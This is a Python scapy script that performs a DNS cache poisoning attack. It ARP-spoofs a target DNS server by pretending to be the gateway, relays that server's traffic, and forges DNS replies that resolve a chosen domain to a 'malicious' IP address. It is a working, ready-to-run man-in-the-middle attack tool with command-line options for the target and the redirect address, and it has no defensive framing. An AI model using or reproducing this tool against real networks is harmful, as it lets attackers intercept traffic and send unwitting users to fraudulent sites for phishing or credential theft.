import argparse
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
import threading
import arpSpoofer

GW_IP = ''  # The IP address of the GW
DNS_IP = ''  # The IP address of the DNS server
DNS_MAC = ''  # The MAC address of the DNS server
GW_MAC = ''  # The MAC address of the GW
SELF_MAC = get_if_hwaddr(conf.iface)  # Own MAC address
SELF_IP = get_if_addr(conf.iface)  # Own IP address
ATTACKED_SITE = ''  # The Domain of the attacked site
MALICIOUS_IP = ''  # The IP address of the malicious site


def forward_to_gw(pkt):
    """
    Forward all the packets from the targeted DNS server to the GW (for the MITM) except the DNS requests for the
    attacked site domain

    :param pkt:
    :return:
    """
    # forward the packet to the GW
    pkt[Ether].dst = GW_MAC

    # if the packet is a DNS request for the targeted site, return a DNS answer with the malicious IP
    if DNS in pkt and ATTACKED_SITE in pkt[DNS][DNSQR].qname:
        pkt = Ether(src=SELF_MAC, dst=DNS_MAC, type=pkt[Ether].type) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(
            sport=pkt[UDP].dport, dport=pkt[UDP].sport) / DNS(
            qr=1,
            id=pkt[DNS].id, ancount=1,
            qd=DNSQR(pkt[DNS][DNSQR]),
            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=MALICIOUS_IP))
    sendp(pkt, verbose=0)


def to_gw(pkt):
    """
    Checks if the packet is from the attacked DNS server to the GW

    :param pkt: The packet ot check
    :return:
    """
    return pkt[Ether].src == DNS_MAC and pkt[Ether].dst == SELF_MAC


def r_traffic_to_gw():
    """
    Sniffs and redirects traffic from the attacked DNS server to the GW

    :return:
    """
    while True:
        sniff(lfilter=to_gw, prn=forward_to_gw)


def main():
    global GW_IP, DNS_IP, GW_MAC, DNS_MAC, ATTACKED_SITE, MALICIOUS_IP, SELF_MAC, SELF_IP
    parser = argparse.ArgumentParser(description='DNS cache poisoning')

    parser.add_argument('-i', '--iface', metavar='IFACE', default=conf.iface, type=str,
                        help='Interface you wish to use (default ' + conf.iface + ')')
    parser.add_argument('-g', '--gw', metavar='IP', type=str, default=conf.route.route("0.0.0.0")[2],
                        help='The address of the gateway (default: ' + conf.route.route("0.0.0.0")[2] + ')')
    parser.add_argument('-d', '--delay', metavar='DELAY', type=int, default=2,
                        help='Delay (in seconds) between ARP messages (default: 2)')
    parser.add_argument('-ms', '--malicious_site', metavar='IP', type=str, default='192.168.1.1',
                        help='The IP of the site you want to redirect to (default: 192.168.1.1) ')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-t', '--target', metavar='IP', type=str,
                          help='IP of DNS target', required=True)
    required.add_argument('-ts', '--target_site', metavar='DOMAIN', type=str,
                          help='The domain of the attacked site')
    args = parser.parse_args()

    # initialize global arguments
    GW_IP = args.gw
    DNS_IP = args.target
    SELF_IP = get_if_addr(conf.iface)
    SELF_MAC = get_if_hwaddr(conf.iface)
    GW_MAC = sr(ARP(op=1, hwsrc=mac2str(SELF_MAC), pdst=GW_IP), verbose=0)[0][0][1].hwsrc
    DNS_MAC = sr(ARP(op=1, hwsrc=mac2str(SELF_MAC), pdst=DNS_IP), verbose=0)[0][0][1].hwsrc
    ATTACKED_SITE = args.target_site
    MALICIOUS_IP = args.malicious_site

    # ARP spoof the DNS server pretending to be the GW
    arp_spoof = threading.Thread(target=arpSpoofer.main, args=(args.iface, DNS_IP, GW_IP, args.delay, False))
    arp_spoof.start()

    # sniff the packets from the DNS server, analyze them and respond if needed
    spoof_gw = threading.Thread(target=r_traffic_to_gw, args=())
    spoof_gw.start()


if __name__ == "__main__":
    main()
